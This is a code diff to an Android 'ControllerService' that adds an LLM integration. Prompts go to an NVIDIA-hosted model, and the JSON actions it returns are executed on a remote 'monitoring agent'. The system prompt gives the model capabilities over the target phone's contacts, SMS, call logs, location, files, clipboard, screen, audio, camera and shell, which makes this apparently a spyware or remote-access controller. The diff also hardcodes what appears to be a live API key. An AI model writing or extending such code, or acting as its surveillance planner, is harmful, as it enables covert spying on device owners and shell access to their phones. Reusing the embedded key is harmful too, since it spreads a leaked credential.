@@ -17,12 +17,22 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 
 const val PREFS_NAME = "controller_config"
 const val KEY_AGENT_PACKAGE = "agent_package"
+
+// NVIDIA Nemotron 3 Ultra 550B (same as agent)
+const val NVIDIA_API_KEY = "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"
+const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
+const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"
 
 class ControllerService : Service() {
 
@@ -210,5 +220,177 @@ class ControllerService : Service() {
             }
             sendBroadcast(uiIntent)
         }
+    }
+
+    // ===== NVIDIA NEMOTRON 3 ULTRA AI INTEGRATION =====
+
+    private val aiClient = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS).build()
+
+    fun sendAiCommand(prompt: String, callback: CommandCallback? = null): String {
+        val taskId = java.util.UUID.randomUUID().toString()
+        val latch = CountDownLatch(1)
+        callback?.let { pendingCommands[taskId] = it }
+
+        Thread({
+            try {
+                // Step 1: Ask Nemotron for action plan
+                val aiResponse = callNemotron(prompt)
+                Log.d("AI", "Nemotron response: $aiResponse")
+
+                // Step 2: Execute AI-generated actions via agent
+                val results = executeAiActions(aiResponse, taskId)
+
+                // Step 3: Compile results
+                val summary = StringBuilder("AI Task $taskId completed:\n\n")
+                results.forEach { r ->
+                    summary.append("Action: ${r["action"]}\n")
+                    summary.append("Reasoning: ${r["reasoning"]}\n")
+                    if (r["status"] == "completed") {
+                        summary.append("Result: ${r["result"]}\n")
+                    } else {
+                        summary.append("Error: ${r["error"]}\n")
+                    }
+                    summary.append("\n")
+                }
+
+                val msg = summary.toString()
+                if (latch.await(60, TimeUnit.SECONDS)) {
+                    callback?.onResult(taskId, CommandResult(msg, null, "completed"))
+                } else {
+                    callback?.onResult(taskId, CommandResult(null, "AI task timed out", "timeout"))
+                }
+            } catch (e: Exception) {
+                Log.e("AI", "Error", e)
+                callback?.onResult(taskId, CommandResult(null, e.message, "failed"))
+            }
+        }, "ai-$taskId").start()
+
+        return taskId
+    }
+
+    private fun callNemotron(prompt: String): String {
+        try {
+            val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
+Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
+For each user request, respond with a JSON object containing:
+{
+  "action": "capability_name",
+  "args": { ... },
+  "reasoning": "why this action"
+}
+If multiple actions needed, return array of actions.
+Only respond with valid JSON, no extra text."""
+
+            val payload = mutableMapOf<String, Any>()
+            payload["model"] = NVIDIA_MODEL
+            payload["messages"] = listOf(
+                mapOf("role" to "system", "content" to systemPrompt),
+                mapOf("role" to "user", "content" to prompt)
+            )
+            payload["temperature"] = 0.1
+            payload["max_tokens"] = 2048
+            payload["top_p"] = 0.9
+            payload["stream"] = false
+
+            val body = gson.toJson(payload).toRequestBody("application/json".toMediaType())
+            val req = Request.Builder()
+                .url(NVIDIA_API_URL)
+                .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
+                .addHeader("Content-Type", "application/json")
+                .post(body)
+                .build()
+
+            val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS).build()
+            client.newCall(req).execute().use { resp ->
+                val responseBody = resp.body?.string() ?: ""
+                if (resp.isSuccessful) {
+                    val json = com.google.gson.JsonParser.parseString(responseBody).asJsonObject
+                    val content = json.get("choices").asJsonArray[0].asJsonObject
+                        .get("message").asJsonObject.get("content").asString
+                    return content
+                } else {
+                    Log.e("Nemotron", "API error: $resp.code - $responseBody")
+                    return "{\"error\": \"API error: $resp.code\"}"
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("Nemotron", "Error", e)
+            return "{\"error\": \"${e.message}\"}"
+        }
+    }
+
+    private fun executeAiActions(aiResponse: String, taskId: String): List<Map<String, Any>> {
+        val results = mutableListOf<Map<String, Any>>()
+        try {
+            val json = com.google.gson.JsonParser.parseString(aiResponse)
+            val actions = when {
+                json.isJsonArray -> json.asJsonArray
+                json.isJsonObject -> {
+                    val arr = com.google.gson.JsonArray()
+                    arr.add(json)
+                    arr
+                }
+                else -> return results
+            }
+
+            actions.forEach { actionJson ->
+                val actionObj = actionJson.asJsonObject
+                val action = actionObj.get("action")?.asString ?: ""
+                val args = actionObj.get("args")?.asJsonObject
+                val reasoning = actionObj.get("reasoning")?.asString ?: ""
+
+                val argsMap = mutableMapOf<String, Any>()
+                args?.entrySet()?.forEach { entry ->
+                    val value = when {
+                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
+                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asNumber()
+                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
+                        else -> entry.value.toString()
+                    }
+                    argsMap[entry.key] = value
+                }
+
+                // Forward to agent and wait for result
+                val latch = CountDownLatch(1)
+                var actionResult: Map<String, Any>? = null
+                val tempCallback = object : CommandCallback {
+                    override fun onResult(tid: String, result: CommandResult) {
+                        if (tid == taskId) {
+                            actionResult = mutableMapOf<String, Any>().apply {
+                                put("action", action)
+                                put("args", argsMap)
+                                put("reasoning", reasoning)
+                                put("result", result.result)
+                                put("error", result.error)
+                                put("status", result.status)
+                            }
+                            latch.countDown()
+                        }
+                    }
+                }
+                pendingCommands["$taskId-$action"] = tempCallback
+
+                sendCommand(action, argsMap, tempCallback)
+
+                if (latch.await(30, TimeUnit.SECONDS)) {
+                    actionResult?.let { results.add(it) }
+                } else {
+                    results.add(mutableMapOf<String, Any>().apply {
+                        put("action", action)
+                        put("args", argsMap)
+                        put("reasoning", reasoning)
+                        put("error", "Action timeout")
+                        put("status", "timeout")
+                    })
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("AI", "Parse error", e)
+            results.add(mutableMapOf<String, Any>().apply {
+                put("error", e.message)
+                put("raw_response", aiResponse)
+            })
+        }
+        return results
     }
 }
